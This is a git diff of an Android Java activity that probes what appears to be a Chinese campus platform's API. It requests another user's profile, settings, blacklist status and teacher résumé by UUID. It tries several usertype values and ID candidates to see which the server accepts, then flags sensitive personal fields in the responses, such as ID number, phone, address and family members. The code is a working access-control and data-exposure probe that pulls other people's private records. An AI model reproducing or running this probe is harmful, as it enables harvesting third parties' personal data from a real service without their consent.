@@ -55,6 +55,8 @@ public class ProbeActivity extends Activity {
             "sfzh", "sfzg", "dh", "sjh", "lxrdh", "lxryj", "jg", "csrq", "csd", "mz", "zzmm",
             "gkksh", "syd", "byzx", "cym", "xz", "nl", "gw", "zc", "yx", "zy", "rxnj", "ssbj",
             "xh", "userid", "uuid", "jtcyset", "jtcy", "jtdz", "dz", "jz", "email",
+            // 教师/人事侧（454 的 step=other 对教师会下发这些键）
+            "jsdm", "bm", "gangwei", "zhichen", "xueli", "xuewei", "xznj", "rxnf", "xxmc",
     };
 
     private TextView out;
@@ -62,6 +64,9 @@ public class ProbeActivity extends Activity {
     private final StringBuilder all = new StringBuilder();
 
     private String name = "", xb = "", bjmc = "", jid = "", uuid = "", utype = "", host = "", raw = "";
+    /** ① 响应里拿到的教师号（t 开头），用于拼 ④ 的 jsid 候选。 */
+    private String jsdm = "";
+    private boolean teacherQueued = false;
     private List<Q> queue = new ArrayList<Q>();
     private int idx = 0;
 
@@ -213,6 +218,8 @@ public class ProbeActivity extends Activity {
     private void runAll() {
         idx = 0;
         all.setLength(0);
+        jsdm = "";
+        teacherQueued = false;
         queue = new ArrayList<Q>();
         if (out != null) {
             out.setText("");
@@ -245,14 +252,23 @@ public class ProbeActivity extends Activity {
         queue.add(new Q("① 他人信息 baseInfoServlet step=other（主接口）",
                 base + "/wap/baseInfoServlet", "GET", m1));
 
+        // ② 官方客户端两处写法不一致：e2/a 用「自己的」usertype，u8/v 用「对方的」usertype
+        //    → 两个都发，看服务端认哪个（其它参数完全相同）
         HashMap<String, String> m2 = new HashMap<String, String>();
         m2.put("action", "getSettings");
         m2.put("step", "getMITAWithOther");
         m2.put("userId", myId);
         m2.put("usertype", myType);
         m2.put("other", uuid);
-        queue.add(new Q("② 对方觅Ta开关 getSettings/getMITAWithOther",
+        queue.add(new Q("②a 对方觅Ta开关 getMITAWithOther（usertype=自己 " + dash(myType) + "）",
                 base + "/wap/wapController.jsp", "GET", m2));
+
+        if (!TextUtils.isEmpty(utype) && !utype.equals(myType)) {
+            HashMap<String, String> m2b = new HashMap<String, String>(m2);
+            m2b.put("usertype", utype);
+            queue.add(new Q("②b 同上（usertype=对方 " + utype + "）",
+                    base + "/wap/wapController.jsp", "GET", m2b));
+        }
 
         HashMap<String, String> m3 = new HashMap<String, String>();
         m3.put("action", "judgeBlackList");
@@ -263,22 +279,56 @@ public class ProbeActivity extends Activity {
         queue.add(new Q("③ 黑名单 judgeBlackList",
                 base + "/wap/wapController.jsp", "GET", m3));
 
-        HashMap<String, String> m4 = new HashMap<String, String>();
-        m4.put("action", "oriHd_ggym");
-        m4.put("step", "GetTeaResume");
-        m4.put("userId", myId);
-        m4.put("usertype", myType);
-        m4.put("userid", suffix(myId));
-        m4.put("jsid", suffix(jid));
-        queue.add(new Q("④ 教师简历 oriHd_ggym/GetTeaResume（学生工号无数据属正常）",
-                base + "/wap/wapController.jsp", "GET", m4));
-
         runNext();
+    }
+
+    /**
+     * ④ 教师简历：官方调用点是 native，看不到它拿什么当 jsid
+     * （① 响应里同时有 jsdm=t1001122 这种教师号 和 userid=10250137 这种平台号）。
+     * ⇒ 两个候选都发一遍，由服务端回答哪个对。① 回来后才入队。
+     */
+    private void enqueueTeacherQueries() {
+        if (teacherQueued) {
+            return;
+        }
+        teacherQueued = true;
+        String base = j0.a == null || j0.a.serviceUrl == null ? "" : j0.a.serviceUrl;
+        String myId = j0.a == null || j0.a.userid == null ? "" : j0.a.userid;
+        String myType = j0.a == null || j0.a.usertype == null ? "" : j0.a.usertype;
+        if (TextUtils.isEmpty(base)) {
+            return;
+        }
+        boolean looksTeacher = (utype != null && utype.toUpperCase().contains("TEA"))
+                || !TextUtils.isEmpty(jsdm);
+        if (!looksTeacher) {
+            headerLine("（目标身份 " + dash(utype) + "、① 里也没有 jsdm → 跳过教师简历查询）\n");
+            return;
+        }
+        String fromJid = suffix(jid);
+        String fromResp = jsdm;
+        if (!TextUtils.isEmpty(fromResp) && !fromResp.equals(fromJid)) {
+            queue.add(teacherQ(base, myId, myType, fromResp, "jsid=①里的 jsdm（教师号）"));
+            queue.add(teacherQ(base, myId, myType, fromJid, "jsid=JID 后缀（平台号，=旧版发法）"));
+        } else if (!TextUtils.isEmpty(fromJid)) {
+            queue.add(teacherQ(base, myId, myType, fromJid, "jsid=JID 后缀"));
+        }
+    }
+
+    private Q teacherQ(String base, String myId, String myType, String jsid, String note) {
+        HashMap<String, String> m = new HashMap<String, String>();
+        m.put("action", "oriHd_ggym");
+        m.put("step", "GetTeaResume");
+        m.put("userId", myId);
+        m.put("usertype", myType);
+        m.put("userid", suffix(myId));
+        m.put("jsid", jsid);
+        return new Q("④ 教师简历 GetTeaResume（" + note + "）",
+                base + "/wap/wapController.jsp", "GET", m);
     }
 
     private void runNext() {
         if (idx >= queue.size()) {
-            status.setText("查询完成（4/4）——「复制全部」可把全文拷走");
+            status.setText("查询完成（" + queue.size() + "/" + queue.size() + "）——「复制全部」可把全文拷走");
             render();
             return;
         }
@@ -319,11 +369,16 @@ public class ProbeActivity extends Activity {
         }
 
         private void finish(final String body, final Exception err) {
+            final int i = idx;
             final String block = format(body, err);
             runOnUiThread(new Runnable() {
                 @Override
                 public void run() {
                     headerLine(block);
+                    if (i == 0) {
+                        // ① 回来了：抓到 jsdm 才能把 ④ 的 jsid 候选凑齐
+                        enqueueTeacherQueries();
+                    }
                     idx++;
                     runNext();
                 }
@@ -344,23 +399,39 @@ public class ProbeActivity extends Activity {
         sb.append(body).append('\n');
         try {
             JSONObject o = new JSONObject(body);
+            if (o.has("jsdm")) {
+                String v = o.optString("jsdm");
+                if (!TextUtils.isEmpty(v)) {
+                    jsdm = v;
+                }
+            }
             int n = 0;
             StringBuilder keys = new StringBuilder();
             StringBuilder hits = new StringBuilder();
             Iterator<String> it = o.keys();
             while (it.hasNext()) {
                 String k = it.next();
+                String v = o.optString(k);
                 n++;
-                keys.append("  ").append(k).append(" = ").append(o.optString(k)).append('\n');
+                keys.append("  ").append(k).append(" = ").append(v)
+                        .append(TextUtils.isEmpty(v) ? "   ← 键在值空" : "").append('\n');
                 for (String s : SENSITIVE) {
                     if (s.equalsIgnoreCase(k)) {
-                        hits.append(k).append(' ');
+                        hits.append(k).append(TextUtils.isEmpty(v) ? "(空)" : "(有值)").append(' ');
                         break;
                     }
                 }
             }
             sb.append("── 解析（顶层 ").append(n).append(" 键）──\n").append(keys);
             sb.append("敏感键命中：").append(hits.length() == 0 ? "（无）" : hits.toString()).append('\n');
+            if (o.has("msg")) {
+                sb.append("服务端 msg：").append(o.optString("msg")).append('\n');
+            }
+            if (o.has("resultSet") || o.has("state") || o.has("flag")) {
+                // 客户端消费面（权威口径）：xm/xb/xxdm/xh|jsdm|userid/ssbj/state
+                sb.append("判定：").append(n > 7 ? "宽行" : "窄行")
+                        .append("（顶层 ").append(n).append(" 键；官方客户端只消费 7 个路由字段）\n");
+            }
             if (o.has("resultSet")) {
                 String rs = o.optString("resultSet");
                 sb.append("resultSet 原始：").append(rs).append('\n');
